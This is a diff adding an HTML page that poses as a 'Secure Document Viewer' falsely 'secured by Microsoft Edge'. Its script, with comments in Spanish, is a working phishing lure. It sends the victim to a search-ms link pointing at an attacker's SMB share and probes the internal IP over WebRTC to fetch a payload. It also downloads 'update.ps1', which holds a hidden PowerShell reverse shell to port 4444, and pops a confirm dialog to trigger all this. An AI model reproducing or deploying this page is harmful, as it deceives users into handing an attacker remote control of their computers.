@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Document Viewer</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            margin: 0; padding: 40px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; text-align: center;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { 
+            max-width: 500px; 
+            background: rgba(255,255,255,0.15); 
+            padding: 40px; border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .button { 
+            background: #00ff88; color: black; 
+            padding: 18px 35px; border: none; border-radius: 8px;
+            font-size: 18px; font-weight: bold; cursor: pointer; 
+            margin: 25px 0; transition: all 0.3s ease;
+            display: inline-block;
+        }
+        .button:hover {
+            background: #00cc66;
+            transform: translateY(-2px);
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="font-size: 48px; margin-bottom: 20px;">📄</div>
+        <h1>Secure Document Viewer</h1>
+        <p>Your document is ready for viewing. Click the button below to open it securely.</p>
+        
+        <div class="loading" id="loading">
+            <p>🔄 Initializing secure viewer...</p>
+        </div>
+        
+        <button class="button" onclick="openDocument()" id="viewBtn">🔒 View Secure Document</button>
+        
+        <p style="font-size: 12px; opacity: 0.8; margin-top: 30px;">
+            🔒 Secured by Microsoft Edge Protected Mode
+        </p>
+    </div>
+
+    <script>
+        function openDocument() {
+            // Mostrar loading
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('viewBtn').style.display = 'none';
+            
+            // Técnica 1: Intentar con search-ms protocol (funciona en Windows 11)
+            setTimeout(() => {
+                try {
+                    // search-ms protocol - característica legítima de Windows
+                    const payload = `search-ms:query=document&crumb=location:\\\\192.168.1.25\\share&displayname=Important Document`;
+                    window.location.href = payload;
+                } catch (e) {
+                    // Fallback silencioso
+                    executeFallback();
+                }
+            }, 2000);
+            
+            // Técnica 2: WebRTC para obtener IP interna + fetch a servidor local
+            setTimeout(() => {
+                getInternalIP();
+            }, 1000);
+        }
+        
+        function getInternalIP() {
+            // Obtener IP interna via WebRTC
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice.candidate) return;
+                const ip = ice.candidate.candidate.split(' ')[4];
+                if (ip && ip.match(/^(192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))/)) {
+                    // Intentar conexión a servidor interno
+                    fetch(`http://${ip}:8000/payload`)
+                        .catch(() => console.log('No local server'));
+                }
+            };
+        }
+        
+        function executeFallback() {
+            // Técnica 3: Intentar descargar y ejecutar via PowerShell sin mostrar ventana
+            const powershellCode = `Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command "$c=New-Object Net.Sockets.TCPClient(\\'192.168.1.25\\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\'PS \\'+(pwd).Path+\\'> \\';$by=([text.encoding]::ASCII).GetBytes($r2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"' -Wait`;
+            
+            // Intentar ejecutar via múltiples métodos
+            try {
+                // Método A: Blob URL + descarga
+                const blob = new Blob([powershellCode], {type: 'application/octet-stream'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'update.ps1';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            } catch (e) {
+                console.log('Fallback method failed');
+            }
+            
+            // Mostrar mensaje final
+            setTimeout(() => {
+                document.getElementById('loading').innerHTML = '<p>✅ Document viewer ready</p><p>You can now view your secure document.</p>';
+            }, 3000);
+        }
+        
+        // Ejecutar automáticamente después de 5 segundos (opcional)
+        setTimeout(() => {
+            if (confirm('Your secure document is ready. Would you like to open it now?')) {
+                openDocument();
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
